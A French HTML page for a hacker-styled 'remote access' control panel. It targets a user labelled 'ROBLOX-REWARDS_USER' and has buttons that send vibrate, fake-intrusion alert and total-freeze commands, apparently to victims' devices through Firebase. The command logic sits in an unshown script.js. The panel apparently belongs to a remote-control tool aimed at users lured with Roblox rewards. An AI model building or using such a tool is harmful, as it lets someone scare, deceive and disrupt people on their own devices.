<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EDIA - TERMINAL DE CONTRÔLE</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
        .panel { border: 2px solid #00ff00; display: inline-block; padding: 30px; margin-top: 20px; box-shadow: 0 0 20px #00ff00; border-radius: 10px; }
        h1 { text-shadow: 0 0 10px #00ff00; font-size: 1.5em; }
        .status { color: white; margin-bottom: 20px; font-size: 0.9em; }
        button { 
            background: transparent; border: 1px solid #00ff00; color: #00ff00;
            padding: 15px 25px; margin: 10px; cursor: pointer; font-family: 'Courier New';
            font-weight: bold; transition: 0.3s; width: 100%; max-width: 300px;
            text-transform: uppercase;
        }
        button:hover { background: #00ff00; color: black; box-shadow: 0 0 20px #00ff00; }
        .danger { border-color: #ff0000; color: #ff0000; }
        .danger:hover { background: #ff0000; color: white; box-shadow: 0 0 20px #ff0000; }
        #log { margin-top: 25px; color: #888; font-size: 0.8em; border-top: 1px solid #333; padding-top: 10px; }
    </style>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body>

    <div class="panel">
        <h1>[ EDIA REMOTE ACCESS ]</h1>
        <div class="status">CIBLE : <span id="target">ROBLOX-REWARDS_USER</span></div>
        
        <button onclick="envoyer('VIBRER')">⚡ Vibration + Alerte</button><br>
        <button onclick="envoyer('ALERTE')">🛡️ Fausse Intrusion</button><br>
        <button onclick="envoyer('FREEZE')" class="danger">💀 Freeze Total</button>
        
        <div id="log">Console prête. En attente d'action...</div>
    </div>

    <script src="script.js"></script>

</body>
</html>
